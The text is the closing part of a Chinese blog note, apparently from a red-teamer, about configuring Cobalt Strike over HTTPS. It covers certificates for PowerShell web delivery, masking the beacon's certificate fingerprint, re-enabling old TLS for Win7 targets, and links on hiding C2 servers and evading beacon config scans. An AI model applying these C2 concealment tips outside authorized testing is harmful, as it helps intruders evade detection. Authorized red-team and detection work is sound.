<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>若要使用web delivery配合https，需要使用真证书过powershell等证书真实性校验<br>若只要抹除beacon https通信的证书特征，随便签一个假证书即可<br>对于win7等较老机器对任何与https有关的操作都不能用的情况，是由于旧机器只支持低版本tls协议而CS服务端不支持低版本tls协议导致的，修补方案为修改<code>jkdpath/jre/lib/security/java.security</code>文件，把<code>jdk.tls.disabledAlgorithms</code>中禁用的老协议去掉即可</p>
<p>无论如何都打不通时，http解决一切烦恼</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://blog.leanote.com/post/snowming/6a724671de78">CS 合法证书 + Powershell 上线</a><br><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/csmo-ren-duan-53e3-zheng-4e66-za-xiang">CS证书相关</a><br><a href="https://www.anquanke.com/post/id/231448">如何隐蔽你的C2</a><br>CS profile教程<br><a href="https://trial.cobaltstrike.com/help-malleable-c2">Malleable Command and Control</a></p>
<p>默认情况下listener会同时在端口运行stage下发payload服务，这个服务能被任何人访问到，导致CS服务器被轻易探测，这里提出了一个躲避方法<br><a href="https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484689&idx=1&sn=8cf9c031f3d926c155ee5c018941b416">Bypass cobaltstrike beacon config scan</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
</search>
